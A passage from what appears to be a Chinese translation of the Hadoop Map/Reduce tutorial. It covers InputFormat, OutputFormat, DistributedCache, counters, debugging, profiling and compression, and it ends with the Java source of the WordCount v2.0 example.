提交作业并监视它的进程。</p><p>有时候，用一个单独的Map/Reduce作业并不能完成一个复杂的任务，用户也许要链接多个Map/Reduce作业才行。这是容易实现的，因为作业通常输出到分布式文件系统上的，所以可以把这个作业的输出作为下一个作业的输入实现串联。</p><p>然而，这也意味着，确保每一作业完成(成功或失败)的责任就直接落在了客户身上。在这种情况下，可以用的控制作业的选项有：</p><ul><li><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobClient.html#runJob(org.apache.hadoop.mapred.JobConf)" target="_blank" rel="noopener">runJob(JobConf)</a>：提交作业，仅当作业完成时返回。</li><li><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobClient.html#submitJob(org.apache.hadoop.mapred.JobConf)" target="_blank" rel="noopener">submitJob(JobConf)</a>：只提交作业，之后需要你轮询它返回的 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/RunningJob.html" target="_blank" rel="noopener">RunningJob</a>句柄的状态，并根据情况调度。</li><li><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setJobEndNotificationURI(java.lang.String)" target="_blank" rel="noopener">JobConf.setJobEndNotificationURI(String)</a>：设置一个作业完成通知，可避免轮询。</li></ul><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/InputFormat.html" target="_blank" rel="noopener">InputFormat</a> 为Map/Reduce作业描述输入的细节规范。</p><p>Map/Reduce框架根据作业的InputFormat来：</p><ol><li>检查作业输入的有效性。</li><li>把输入文件切分成多个逻辑InputSplit实例， 并把每一实例分别分发给一个 Mapper。</li><li>提供RecordReader的实现，这个RecordReader从逻辑InputSplit中获得输入记录， 这些记录将由Mapper处理。</li></ol><p>基于文件的InputFormat实现（通常是 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileInputFormat.html" target="_blank" rel="noopener">FileInputFormat</a>的子类） 默认行为是按照输入文件的字节大小，把输入数据切分成逻辑分块（<em>logical</em> InputSplit ）。 其中输入文件所在的FileSystem的数据块尺寸是分块大小的上限。下限可以设置mapred.min.split.size 的值。</p><p>考虑到边界情况，对于很多应用程序来说，很明显按照文件大小进行逻辑分割是不能满足需求的。 在这种情况下，应用程序需要实现一个RecordReader来处理记录的边界并为每个任务提供一个逻辑分块的面向记录的视图。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/TextInputFormat.html" target="_blank" rel="noopener">TextInputFormat</a> 是默认的InputFormat。</p><p>如果一个作业的Inputformat是TextInputFormat， 并且框架检测到输入文件的后缀是<em>.gz*和</em>.lzo*，就会使用对应的CompressionCodec自动解压缩这些文件。 但是需要注意，上述带后缀的压缩文件不会被切分，并且整个压缩文件会分给一个mapper来处理。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/InputSplit.html" target="_blank" rel="noopener">InputSplit</a> 是一个单独的Mapper要处理的数据块。</p><p>一般的InputSplit 是字节样式输入，然后由RecordReader处理并转化成记录样式。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileSplit.html" target="_blank" rel="noopener">FileSplit</a> 是默认的InputSplit。 它把 map.input.file 设定为输入文件的路径，输入文件是逻辑分块文件。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/RecordReader.html" target="_blank" rel="noopener">RecordReader</a> 从InputSlit读入&lt;key, value&gt;对。</p><p>一般的，RecordReader 把由InputSplit 提供的字节样式的输入文件，转化成由Mapper处理的记录样式的文件。 因此RecordReader负责处理记录的边界情况和把数据表示成keys/values对形式。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/OutputFormat.html" target="_blank" rel="noopener">OutputFormat</a> 描述Map/Reduce作业的输出样式。</p><p>Map/Reduce框架根据作业的OutputFormat来：</p><ol><li>检验作业的输出，例如检查输出路径是否已经存在。</li><li>提供一个RecordWriter的实现，用来输出作业结果。 输出文件保存在FileSystem上。</li></ol><p>TextOutputFormat是默认的 OutputFormat。</p><p>在一些应用程序中，子任务需要产生一些side-file，这些文件与作业实际输出结果的文件不同。</p><p>在这种情况下，同一个Mapper或者Reducer的两个实例（比如预防性任务）同时打开或者写 FileSystem上的同一文件就会产生冲突。因此应用程序在写文件的时候需要为每次任务尝试（不仅仅是每次任务，每个任务可以尝试执行很多次）选取一个独一无二的文件名(使用attemptid，例如task_200709221812_0001_m_000000_0)。</p><p>为了避免冲突，Map/Reduce框架为每次尝试执行任务都建立和维护一个特殊的 ${mapred.output.dir}/<em>temporary/</em>${taskid}子目录，这个目录位于本次尝试执行任务输出结果所在的FileSystem上，可以通过 ${mapred.work.output.dir}来访问这个子目录。 对于成功完成的任务尝试，只有${mapred.output.dir}/<em>temporary/</em>${taskid}下的文件会<em>移动</em>到${mapred.output.dir}。当然，框架会丢弃那些失败的任务尝试的子目录。这种处理过程对于应用程序来说是完全透明的。</p><p>在任务执行期间，应用程序在写文件时可以利用这个特性，比如 通过<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileOutputFormat.html#getWorkOutputPath(org.apache.hadoop.mapred.JobConf)" target="_blank" rel="noopener"> FileOutputFormat.getWorkOutputPath()</a>获得${mapred.work.output.dir}目录， 并在其下创建任意任务执行时所需的side-file，框架在任务尝试成功时会马上移动这些文件，因此不需要在程序内为每次任务尝试选取一个独一无二的名字。</p><p>注意：在每次任务尝试执行期间，${mapred.work.output.dir} 的值实际上是 ${mapred.output.dir}/<em>temporary/</em>{$taskid}，这个值是Map/Reduce框架创建的。 所以使用这个特性的方法是，在<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileOutputFormat.html#getWorkOutputPath(org.apache.hadoop.mapred.JobConf)" target="_blank" rel="noopener"> FileOutputFormat.getWorkOutputPath() </a>路径下创建side-file即可。</p><p>对于只使用map不使用reduce的作业，这个结论也成立。这种情况下，map的输出结果直接生成到HDFS上。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/RecordWriter.html" target="_blank" rel="noopener">RecordWriter</a> 生成&lt;key, value&gt; 对到输出文件。</p><p>RecordWriter的实现把作业的输出结果写到 FileSystem。</p><h4 id="Counters"><a href="#Counters" class="headerlink" title="Counters"></a>Counters</h4><p>Counters 是多个由Map/Reduce框架或者应用程序定义的全局计数器。 每一个Counter可以是任何一种 Enum类型。同一特定Enum类型的Counter可以汇集到一个组，其类型为Counters.Group。</p><p>应用程序可以定义任意(Enum类型)的Counters并且可以通过 map 或者 reduce方法中的 [Reporter.incrCounter(Enum, long)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Reporter.html#incrCounter" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Reporter.html#incrCounter</a>(java.lang.Enum, long))或者 [Reporter.incrCounter(String, String, long)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Reporter.html#incrCounter" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/Reporter.html#incrCounter</a>(java.lang.String, java.lang.String, long amount)) 更新。之后框架会汇总这些全局counters。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html" target="_blank" rel="noopener">DistributedCache</a> 可将具体应用相关的、大尺寸的、只读的文件有效地分布放置。</p><p>DistributedCache 是Map/Reduce框架提供的功能，能够缓存应用程序所需的文件 （包括文本，档案文件，jar文件等）。</p><p>应用程序在JobConf中通过url(hdfs://)指定需要被缓存的文件。 DistributedCache假定由hdfs://格式url指定的文件已经在 FileSystem上了。</p><p>Map-Redcue框架在作业所有任务执行之前会把必要的文件拷贝到slave节点上。 它运行高效是因为每个作业的文件只拷贝一次并且为那些没有文档的slave节点缓存文档。</p><p>DistributedCache 根据缓存文档修改的时间戳进行追踪。 在作业执行期间，当前应用程序或者外部程序不能修改缓存文件。</p><p>distributedCache可以分发简单的只读数据或文本文件，也可以分发复杂类型的文件例如归档文件和jar文件。归档文件(zip,tar,tgz和tar.gz文件)在slave节点上会被<em>解档（un-archived）</em>。 这些文件可以设置<em>执行权限</em>。</p><p>用户可以通过设置mapred.cache.{files|archives}来分发文件。 如果要分发多个文件，可以使用逗号分隔文件所在路径。也可以利用API来设置该属性： [DistributedCache.addCacheFile(URI,conf)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html#addCacheFile" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html#addCacheFile</a>(java.net.URI, org.apache.hadoop.conf.Configuration))/ [DistributedCache.addCacheArchive(URI,conf)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html#addCacheArchive" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html#addCacheArchive</a>(java.net.URI, org.apache.hadoop.conf.Configuration)) and [DistributedCache.setCacheFiles(URIs,conf)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html#setCacheFiles" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html#setCacheFiles</a>(java.net.URI[], org.apache.hadoop.conf.Configuration))/ [DistributedCache.setCacheArchives(URIs,conf)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html#setCacheArchives" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html#setCacheArchives</a>(java.net.URI[], org.apache.hadoop.conf.Configuration)) 其中URI的形式是 hdfs://host:port/absolute-path#link-name 在Streaming程序中，可以通过命令行选项 -cacheFile/-cacheArchive 分发文件。</p><p>用户可以通过<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html#createSymlink(org.apache.hadoop.conf.Configuration)" target="_blank" rel="noopener"> DistributedCache.createSymlink(Configuration)</a>方法让DistributedCache 在<em>当前工作目录</em>下创建到缓存文件的符号链接。 或者通过设置配置文件属性mapred.create.symlink为yes。 分布式缓存会截取URI的片段作为链接的名字。 例如，URI是 hdfs://namenode:port/lib.so.1#lib.so， 则在task当前工作目录会有名为lib.so的链接， 它会链接分布式缓存中的lib.so.1。</p><p>DistributedCache可在map/reduce任务中作为 一种基础软件分发机制使用。它可以被用于分发jar包和本地库（native libraries）。 [DistributedCache.addArchiveToClassPath(Path, Configuration)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html#addArchiveToClassPath" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html#addArchiveToClassPath</a>(org.apache.hadoop.fs.Path, org.apache.hadoop.conf.Configuration))和 [DistributedCache.addFileToClassPath(Path, Configuration)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html#addFileToClassPath" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/filecache/DistributedCache.html#addFileToClassPath</a>(org.apache.hadoop.fs.Path, org.apache.hadoop.conf.Configuration)) API能够被用于 缓存文件和jar包，并把它们加入子jvm的<em>classpath</em>。也可以通过设置配置文档里的属性 mapred.job.classpath.{files|archives}达到相同的效果。缓存文件可用于分发和装载本地库。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/util/Tool.html" target="_blank" rel="noopener">Tool</a> 接口支持处理常用的Hadoop命令行选项。</p><p>Tool 是Map/Reduce工具或应用的标准。应用程序应只处理其定制参数， 要把标准命令行选项通过 [ToolRunner.run(Tool, String[])](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/util/ToolRunner.html#run" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/util/ToolRunner.html#run</a>(org.apache.hadoop.util.Tool, java.lang.String[])) 委托给 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/util/GenericOptionsParser.html" target="_blank" rel="noopener">GenericOptionsParser</a>处理。</p><p>Hadoop命令行的常用选项有：<br>-conf <configuration file=""><br>-D &lt;property=value&gt;<br>-fs &lt;local|namenode:port&gt;<br>-jt &lt;local|jobtracker:port&gt;</configuration></p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/IsolationRunner.html" target="_blank" rel="noopener">IsolationRunner</a> 是帮助调试Map/Reduce程序的工具。</p><p>使用IsolationRunner的方法是，首先设置 keep.failed.task.files属性为true （同时参考keep.task.files.pattern）。</p><p>然后，登录到任务运行失败的节点上，进入 TaskTracker的本地路径运行 IsolationRunner：<br>$ cd <local path="">/taskTracker/${taskid}/work<br>$ bin/hadoop org.apache.hadoop.mapred.IsolationRunner ../job.xml</local></p><p>IsolationRunner会把失败的任务放在单独的一个能够调试的jvm上运行，并且采用和之前完全一样的输入数据。</p><p>Profiling是一个工具，它使用内置的java profiler工具进行分析获得(2-3个)map或reduce样例运行分析报告。</p><p>用户可以通过设置属性mapred.task.profile指定系统是否采集profiler信息。 利用api<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setProfileEnabled(boolean)" target="_blank" rel="noopener"> JobConf.setProfileEnabled(boolean)可以修改属性值</a>。如果设为true， 则开启profiling功能。profiler信息保存在用户日志目录下。缺省情况，profiling功能是关闭的。</p><p>如果用户设定使用profiling功能，可以使用配置文档里的属性 mapred.task.profile.{maps|reduces} 设置要profile map/reduce task的范围。设置该属性值的api是 [JobConf.setProfileTaskRange(boolean,String)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setProfileTaskRange" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setProfileTaskRange</a>(boolean, java.lang.String))。 范围的缺省值是0-2。</p><p>用户可以通过设定配置文档里的属性mapred.task.profile.params 来指定profiler配置参数。修改属性要使用api <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setProfileParams(java.lang.String)" target="_blank" rel="noopener">JobConf.setProfileParams(String)</a>。当运行task时，如果字符串包含%s。 它会被替换成profileing的输出文件名。这些参数会在命令行里传递到子JVM中。缺省的profiling 参数是 -agentlib:hprof=cpu=samples,heap=sites,force=n,thread=y,verbose=n,file=%s。</p><p>Map/Reduce框架能够运行用户提供的用于调试的脚本程序。 当map/reduce任务失败时，用户可以通过运行脚本在任务日志（例如任务的标准输出、标准错误、系统日志以及作业配置文件）上做后续处理工作。用户提供的调试脚本程序的标准输出和标准错误会输出为诊断文件。如果需要的话这些输出结果也可以打印在用户界面上。</p><p>在接下来的章节，我们讨论如何与作业一起提交调试脚本。为了提交调试脚本， 首先要把这个脚本分发出去，而且还要在配置文件里设置。</p><p>用户要用 <a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#DistributedCache" target="_blank" rel="noopener">DistributedCache</a> 机制来<em>分发</em>和<em>链接</em>脚本文件</p><p>一个快速提交调试脚本的方法是分别为需要调试的map任务和reduce任务设置 “mapred.map.task.debug.script” 和 “mapred.reduce.task.debug.script” 属性的值。这些属性也可以通过 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setMapDebugScript(java.lang.String)" target="_blank" rel="noopener">JobConf.setMapDebugScript(String) </a>和 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setReduceDebugScript(java.lang.String)" target="_blank" rel="noopener">JobConf.setReduceDebugScript(String) </a>API来设置。对于streaming， 可以分别为需要调试的map任务和reduce任务使用命令行选项-mapdebug 和 -reducedegug来提交调试脚本。</p><p>脚本的参数是任务的标准输出、标准错误、系统日志以及作业配置文件。在运行map/reduce失败的节点上运行调试命令是：<br>$script $stdout $stderr $syslog $jobconf</p><p>Pipes 程序根据第五个参数获得c++程序名。 因此调试pipes程序的命令是<br>$script $stdout $stderr $syslog $jobconf $program</p><p>对于pipes，默认的脚本会用gdb处理core dump， 打印 stack trace并且给出正在运行线程的信息。</p><p><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/jobcontrol/package-summary.html" target="_blank" rel="noopener">JobControl</a>是一个工具，它封装了一组Map/Reduce作业以及他们之间的依赖关系。</p><p>Hadoop Map/Reduce框架为应用程序的写入文件操作提供压缩工具，这些工具可以为map输出的中间数据和作业最终输出数据（例如reduce的输出）提供支持。它还附带了一些 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/io/compress/CompressionCodec.html" target="_blank" rel="noopener">CompressionCodec</a>的实现，比如实现了 <a href="http://www.zlib.net/" target="_blank" rel="noopener">zlib</a>和<a href="http://www.oberhumer.com/opensource/lzo/" target="_blank" rel="noopener">lzo</a>压缩算法。 Hadoop同样支持<a href="http://www.gzip.org/" target="_blank" rel="noopener">gzip</a>文件格式。</p><p>考虑到性能问题（zlib）以及Java类库的缺失（lzo）等因素，Hadoop也为上述压缩解压算法提供本地库的实现。更多的细节请参考 <a href="http://hadoop.apache.org/docs/r1.0.4/cn/native_libraries.html" target="_blank" rel="noopener">这里</a>。</p><p>应用程序可以通过 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setCompressMapOutput(boolean)" target="_blank" rel="noopener">JobConf.setCompressMapOutput(boolean)</a>api控制map输出的中间结果，并且可以通过 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/JobConf.html#setMapOutputCompressorClass(java.lang.Class)" target="_blank" rel="noopener">JobConf.setMapOutputCompressorClass(Class)</a>api指定 CompressionCodec。</p><p>应用程序可以通过 [FileOutputFormat.setCompressOutput(JobConf, boolean)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileOutputFormat.html#setCompressOutput" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileOutputFormat.html#setCompressOutput</a>(org.apache.hadoop.mapred.JobConf, boolean)) api控制输出是否需要压缩并且可以使用 [FileOutputFormat.setOutputCompressorClass(JobConf, Class)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileOutputFormat.html#setOutputCompressorClass" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/FileOutputFormat.html#setOutputCompressorClass</a>(org.apache.hadoop.mapred.JobConf, java.lang.Class))api指定CompressionCodec。</p><p>如果作业输出要保存成 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/SequenceFileOutputFormat.html" target="_blank" rel="noopener">SequenceFileOutputFormat</a>格式，需要使用 [SequenceFileOutputFormat.setOutputCompressionType(JobConf, SequenceFile.CompressionType)](<a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/SequenceFileOutputFormat.html#setOutputCompressionType" target="_blank" rel="noopener">https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/SequenceFileOutputFormat.html#setOutputCompressionType</a>(org.apache.hadoop.mapred.JobConf, org.apache.hadoop.io.SequenceFile.CompressionType))api，来设定 SequenceFile.CompressionType (i.e. RECORD / BLOCK - 默认是RECORD)。</p><h2 id="例子：WordCount-v2-0"><a href="#例子：WordCount-v2-0" class="headerlink" title="例子：WordCount v2.0"></a>例子：WordCount v2.0</h2><p>这里是一个更全面的WordCount例子，它使用了我们已经讨论过的很多Map/Reduce框架提供的功能。</p><p>运行这个例子需要HDFS的某些功能，特别是 DistributedCache相关功能。因此这个例子只能运行在 <a href="http://hadoop.apache.org/docs/r1.0.4/cn/quickstart.html#SingleNodeSetup" target="_blank" rel="noopener">伪分布式</a> 或者 <a href="http://hadoop.apache.org/docs/r1.0.4/cn/quickstart.html#Fully-Distributed+Operation" target="_blank" rel="noopener">完全分布式模式</a>的 Hadoop上。</p><table><thead><tr><th align="center"></th><th align="center">WordCount.java</th></tr></thead><tbody><tr><td align="center">1.</td><td align="center">package org.myorg;</td></tr><tr><td align="center">2.</td><td align="center"></td></tr><tr><td align="center">3.</td><td align="center">import java.io.*;</td></tr><tr><td align="center">4.</td><td align="center">import java.util.*;</td></tr><tr><td align="center">5.</td><td align="center"></td></tr><tr><td align="center">6.</td><td align="center">import org.apache.hadoop.fs.Path;</td></tr><tr><td align="center">7.</td><td align="center">import org.apache.hadoop.filecache.DistributedCache;</td></tr><tr><td align="center">8.</td><td align="center">import org.apache.hadoop.conf.*;</td></tr><tr><td align="center">9.</td><td align="center">import org.apache.hadoop.io.*;</td></tr><tr><td align="center">10.</td><td align="center">import org.apache.hadoop.mapred.*;</td></tr><tr><td align="center">11.</td><td align="center">import org.apache.hadoop.util.*;</td></tr><tr><td align="center">12.</td><td align="center"></td></tr><tr><td align="center">13.</td><td align="center">public class WordCount extends Configured implements Tool {</td></tr><tr><td align="center">14.</td><td align="center"></td></tr><tr><td align="center">15.</td><td align="center">public static class Map extends MapReduceBase implements Mapper&lt;LongWritable, Text, Text, IntWritable&gt; {</td></tr><tr><td align="center">16.</td><td align="center"></td></tr><tr><td align="center">17.</td><td align="center">static enum Counters { INPUT_WORDS }</td></tr><tr><td align="center">18.</td><td align="center"></td></tr><tr><td align="center">19.</td><td align="center">private final static IntWritable one = new IntWritable(1);</td></tr><tr><td align="center">20.</td><td align="center">private Text word = new Text();</td></tr><tr><td align="center">21.</td><td align="center"></td></tr><tr><td align="center">22.</td><td align="center">private boolean caseSensitive = true;</td></tr><tr><td align="center">23.</td><td align="center">private Set<string> patternsToSkip = new HashSet<string>();</string></string></td></tr><tr><td align="center">24.</td><td align="center"></td></tr><tr><td align="center">25.</td><td align="center">private long numRecords = 0;</td></tr><tr><td align="center">26.</td><td align="center">private String inputFile;</td></tr><tr><td align="center">27.</td><td align="center"></td></tr><tr><td align="center">28.</td><td align="center">public void configure(JobConf job) {</td></tr><tr><td align="center">29.</td><td align="center">caseSensitive = job.getBoolean(“wordcount.case.sensitive”, true);</td></tr><tr><td align="center">30.</td><td align="center">inputFile = job.get(“map.input.file”);</td></tr><tr><td align="center">31.</td><td align="center"></td></tr><tr><td align="center">32.</td><td align="center">if (job.getBoolean(“wordcount.skip.patterns”, false)) {</td></tr><tr><td align="center">33.</td><td align="center">Path[] patternsFiles = new Path[0];</td></tr><tr><td align="center">34.</td><td align="center">try {</td></tr><tr><td align="center">35.</td><td align="center">patternsFiles = DistributedCache.getLocalCacheFiles(job);</td></tr><tr><td align="center">36.</td><td align="center">} catch (IOException ioe) {</td></tr><tr><td align="center">37.</td><td align="center">System.err.println(“Caught exception while getting cached files: “ + StringUtils.stringifyException(ioe));</td></tr><tr><td align="center">38.</td><td align="center">}</td></tr><tr><td align="center">39.</td><td align="center">for (Path patternsFile : patternsFiles) {</td></tr><tr><td align="center">40.</td><td align="center">parseSkipFile(patternsFile);</td></tr><tr><td align="center">41.</td><td align="center">}</td></tr><tr><td align="center">42.</td><td align="center">}</td></tr><tr><td align="center">43.</td><td align="center">}</td></tr><tr><td align="center">44.</td><td align="center"></td></tr><tr><td align="center">45.</td><td align="center">private void parseSkipFile(Path patternsFile) {</td></tr><tr><td align="center">46.</td><td align="center">try {</td></tr><tr><td align="center">47.</td><td align="center">BufferedReader fis = new BufferedReader(new FileReader(patternsFile.toString()));</td></tr><tr><td align="center">48.</td><td align="center">String pattern = null;</td></tr><tr><td align="center">49.</td><td align="center">while ((pattern = fis.readLine()) != null) {</td></tr><tr><td align="center">50.</td><td align="center">patternsToSkip.add(pattern);</td></tr><tr><td align="center">51.</td><td align="center">}</td></tr><tr><td align="center">52.</td><td align="center">} catch (IOException ioe) {</td></tr><tr><td align="center">53.</td><td align="center">System.err.println(“Caught exception while parsing the cached file ‘“ + patternsFile + “‘ : “ + StringUtils.stringifyException(ioe));</td></tr><tr><td align="center">54.</td><td align="center">}</td></tr><tr><td align="center">55.</td><td align="center">}</td></tr><tr><td align="center">56.</td><td align="center"></td></tr><tr><td align="center">57.</td><td align="center">public void map(LongWritable key, Text value, OutputCollector&lt;Text, IntWritable&gt; output, Reporter reporter) throws IOException {</td></tr><tr><td align="center">58.</td><td align="center">String line = (caseSensitive) ? value.toString() : value.toString().toLowerCase();</td></tr><tr><td align="center">59.</td><td align="center"></td></tr><tr><td align="center">60.</td><td align="center">for (String pattern : patternsToSkip) {</td></tr><tr><td align="center">61.</td><td align="center">line = line.replaceAll(pattern, “”);</td></tr><tr><td align="center">62.</td><td align="center">}</td></tr><tr><td align="center">63.</td><td align="center"></td></tr><tr><td align="center">64.</td><td align="center">StringTokenizer tokenizer = new StringTokenizer(line);</td></tr><tr><td align="center">65.</td><td align="center">while (tokenizer.hasMoreTokens()) {</td></tr><tr><td align="center">66.</td><td align="center">word.set(tokenizer.nextToken());</td></tr><tr><td align="center">67.</td><td align="center">output.collect(word, one);</td></tr><tr><td align="center">68.</td><td align="center">reporter.incrCounter(Counters.INPUT_WORDS, 1);</td></tr><tr><td align="center">69.</td><td align="center">}</td></tr><tr><td align="center">70.</td><td align="center"></td></tr><tr><td align="center">71.</td><td align="center">if ((++numRecords % 100) == 0) {</td></tr><tr><td align="center">72.</td><td align="center">reporter.setStatus(“Finished processing “ + numRecords + “ records “ + “from the input file: “ + inputFile);</td></tr><tr><td align="center">73.</td><td align="center">}</td></tr><tr><td align="center">74.</td><td align="center">}</td></tr><tr><td align="center">75.</td><td align="center">}</td></tr><tr><td align="center">76.</td><td align="center"></td></tr><tr><td align="center">77.</td><td align="center">public static class Reduce extends MapReduceBase implements Reducer&lt;Text, IntWritable, Text, IntWritable&gt; {</td></tr><tr><td align="center">78.</td><td align="center">public void reduce(Text key, Iterator<intwritable> values, OutputCollector&lt;Text, IntWritable&gt; output, Reporter reporter) throws IOException {</intwritable></td></tr><tr><td align="center">79.</td><td align="center">int sum = 0;</td></tr><tr><td align="center">80.</td><td align="center">while (values.hasNext()) {</td></tr><tr><td align="center">81.</td><td align="center">sum += values.next().get();</td></tr><tr><td align="center">82.</td><td align="center">}</td></tr><tr><td align="center">83.</td><td align="center">output.collect(key, new IntWritable(sum));</td></tr><tr><td align="center">84.</td><td align="center">}</td></tr><tr><td align="center">85.</td><td align="center">}</td></tr><tr><td align="center">86.</td><td align="center"></td></tr><tr><td align="center">87.</td><td align="center">public int run(String[] args) throws Exception {</td></tr><tr><td align="center">88.</td><td align="center">JobConf conf = new JobConf(getConf(), WordCount.class);</td></tr><tr><td align="center">89.</td><td align="center">conf.setJobName(“wordcount”);</td></tr><tr><td align="center">90.</td><td align="center"></td></tr><tr><td align="center">91.</td><td align="center">conf.setOutputKeyClass(Text.class);</td></tr><tr><td align="center">92.</td><td align="center">conf.setOutputValueClass(IntWritable.class);</td></tr><tr><td align="center">93.</td><td align="center"></td></tr><tr><td align="center">94.</td><td align="center">conf.setMapperClass(Map.class);</td></tr><tr><td align="center">95.</td><td align="center">conf.setCombinerClass(Reduce.class);</td></tr><tr><td align="center">96.</td><td align="center">conf.setReducerClass(Reduce.class);</td></tr><tr><td align="center">97.</td><td align="center"></td></tr><tr><td align="center">98.</td><td align="center">conf.setInputFormat(TextInputFormat.class);</td></tr><tr><td align="center">99.</td><td align="center">conf.setOutputFormat(TextOutputFormat.class);</td></tr><tr><td align="center">100.</td><td align="center"></td></tr><tr><td align="center">101.</td><td align="center">List<string> other_args = new ArrayList<string>();</string></string></td></tr><tr><td align="center">102.</td><td align="center">for (int i=0; i &lt; args.length; ++i) {</td></tr><tr><td align="center">103.</td><td align="center">if (“-skip”.equals(args[i])) {</td></tr><tr><td align="center">104.</td><td align="center">DistributedCache.addCacheFile(new Path(args[++i]).toUri(), conf);</td></tr><tr><td align="center">105.</td><td align="center">conf.setBoolean(“wordcount.skip.patterns”, true);</td></tr><tr><td align="center">106.</td><td align="center">} else {</td></tr><tr><td align="center">107.</td><td align="center">other_args.add(args[i]);</td></tr><tr><td align="center">108.</td><td align="center">}</td></tr><tr><td align="center">109.</td><td align="center">}</td></tr><tr><td align="center">110.</td><td align="center"></td></tr><tr><td align="center">111.</td><td align="center">FileInputFormat.setInputPaths(conf, new Path(other_args.get(0)));</td></tr><tr><td align="center">112.</td><td align="center">FileOutputFormat.setOutputPath(conf, new Path(other_args.get(1)));</td></tr><tr><td align="center">113.</td><td align="center"></td></tr><tr><td align="center">114.</td><td align="center">JobClient.runJob(conf);</td></tr><tr><td align="center">115.</td><td align="center">return 0;</td></tr><tr><td align="center">116.</td><td align="center">}</td></tr><tr><td align="center">117.</td><td align="center"></td></tr><tr><td align="center">118.</td><td align="center">public static void main(String[] args) throws Exception {</td></tr><tr><td align="center">119.</td><td align="center">int res = ToolRunner.run(new Configuration(), new WordCount(), args);</td></tr><tr><td align="center">120.</td><td align="center">System.exit(res);</td></tr><tr><td align="center">121.</td><td align="center">}</td></tr><tr><td align="center">122.</td><td align="center">}</td></tr><tr><td align="center">123.</td><td align="center"></td></tr></tbody></table><p>输入样例：</p><p>$ bin/hadoop dfs -ls 